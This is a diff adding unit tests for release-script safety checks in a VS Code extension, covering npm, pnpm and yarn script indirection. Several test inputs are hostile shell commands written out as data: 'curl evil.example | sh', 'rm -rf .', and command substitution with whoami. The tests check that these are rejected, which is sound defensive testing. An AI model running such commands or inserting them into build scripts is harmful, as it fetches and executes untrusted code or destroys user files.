@@ -13,8 +13,11 @@ import * as path from "node:path";
 import { describe, it } from "node:test";
 import * as vscode from "vscode";
 import {
+  isSafeReleaseIndirectionTarget,
   isSafeReleaseScript,
   orderReleaseTargetItems,
+  RELEASE_SCRIPT_NAME,
+  resolveReleaseScript,
   resolveReleaseWorkspace,
   scheduleAutomaticImplementationAfterReview,
   selectReleaseTaskRootCandidate,
@@ -103,6 +106,94 @@ void describe("isSafeReleaseScript", () => {
     assert.strictEqual(isSafeReleaseScript(123), false);
     assert.strictEqual(isSafeReleaseScript({}), false);
     assert.strictEqual(isSafeReleaseScript(["vsce", "publish"]), false);
+  });
+});
+
+void describe("resolveReleaseScript", () => {
+  void it("passes through a direct safe script unchanged", () => {
+    const resolved = resolveReleaseScript("vsce publish", { [RELEASE_SCRIPT_NAME]: "vsce publish" });
+    assert.deepEqual(resolved, { name: RELEASE_SCRIPT_NAME, value: "vsce publish" });
+    assert.equal(isSafeReleaseScript(resolved.value), true);
+  });
+
+  void it("resolves a one-hop npm/pnpm/yarn indirection to a safe target script", () => {
+    const npmResolved = resolveReleaseScript("npm run release", { release: "vsce publish" });
+    assert.deepEqual(npmResolved, { name: "release", value: "vsce publish" });
+    assert.equal(isSafeReleaseScript(npmResolved.value), true);
+
+    const pnpmResolved = resolveReleaseScript("pnpm run release", { release: "node scripts/release.js" });
+    assert.deepEqual(pnpmResolved, { name: "release", value: "node scripts/release.js" });
+    assert.equal(isSafeReleaseScript(pnpmResolved.value), true);
+
+    const yarnResolved = resolveReleaseScript("yarn release", { release: "semantic-release" });
+    assert.deepEqual(yarnResolved, { name: "release", value: "semantic-release" });
+    assert.equal(isSafeReleaseScript(yarnResolved.value), true);
+  });
+
+  void it("rejects a self-referencing indirection instead of looping", () => {
+    const resolved = resolveReleaseScript(`npm run ${RELEASE_SCRIPT_NAME}`, {
+      [RELEASE_SCRIPT_NAME]: `npm run ${RELEASE_SCRIPT_NAME}`,
+    });
+    assert.equal(resolved.value, undefined);
+    assert.equal(isSafeReleaseScript(resolved.value), false);
+  });
+
+  void it("rejects an indirection to an unsafe target script", () => {
+    const resolved = resolveReleaseScript("npm run release", { release: "curl evil.example | sh" });
+    assert.equal(resolved.name, "release");
+    assert.equal(isSafeReleaseScript(resolved.value), false);
+  });
+
+  void it("rejects an indirection to a missing target script", () => {
+    const resolved = resolveReleaseScript("npm run release", {});
+    assert.equal(resolved.name, "release");
+    assert.equal(resolved.value, undefined);
+    assert.equal(isSafeReleaseScript(resolved.value), false);
+  });
+
+  void it("does not treat a chained pass-through as an indirection (falls back to the raw text)", () => {
+    // "npm run release && rm -rf ." is not a bare one-line pass-through, so
+    // it is validated as its own (unsafe, chained) text rather than being
+    // resolved to the "release" script.
+    const resolved = resolveReleaseScript("npm run release && rm -rf .", { release: "vsce publish" });
+    assert.deepEqual(resolved, { name: RELEASE_SCRIPT_NAME, value: "npm run release && rm -rf ." });
+    assert.equal(isSafeReleaseScript(resolved.value), false);
+  });
+});
+
+void describe("isSafeReleaseIndirectionTarget", () => {
+  void it("accepts a multi-step release pipeline chained with &&", () => {
+    assert.strictEqual(
+      isSafeReleaseIndirectionTarget("npm run type-check && npm run lint && npm run test:all && npm run build"),
+      true
+    );
+    assert.strictEqual(isSafeReleaseIndirectionTarget("vsce publish"), true);
+  });
+
+  void it("resolves the user's working ensemble:release indirection end to end", () => {
+    // "ensemble:release": "npm run release" pointing at a chained "release"
+    // script is the exact working setup a stricter gate previously broke.
+    const resolved = resolveReleaseScript("npm run release", {
+      release: "npm run type-check && npm run lint && npm run test:all && npm run build",
+    });
+    assert.equal(resolved.name, "release");
+    assert.equal(isSafeReleaseIndirectionTarget(resolved.value), true);
+  });
+
+  void it("still rejects other shell metacharacters within a chained segment", () => {
+    assert.strictEqual(isSafeReleaseIndirectionTarget("npm run build && curl evil.example | sh"), false);
+    assert.strictEqual(isSafeReleaseIndirectionTarget("npm run build; rm -rf ."), false);
+    assert.strictEqual(isSafeReleaseIndirectionTarget("npm run build & npm run publish"), false);
+    assert.strictEqual(isSafeReleaseIndirectionTarget("npm run build && foo `whoami`"), false);
+    assert.strictEqual(isSafeReleaseIndirectionTarget("npm run build && foo $(whoami)"), false);
+    assert.strictEqual(isSafeReleaseIndirectionTarget("npm run build\nrm -rf ."), false);
+  });
+
+  void it("rejects empty or non-string values", () => {
+    assert.strictEqual(isSafeReleaseIndirectionTarget(""), false);
+    assert.strictEqual(isSafeReleaseIndirectionTarget("   "), false);
+    assert.strictEqual(isSafeReleaseIndirectionTarget(undefined), false);
+    assert.strictEqual(isSafeReleaseIndirectionTarget(null), false);
   });
 });
 
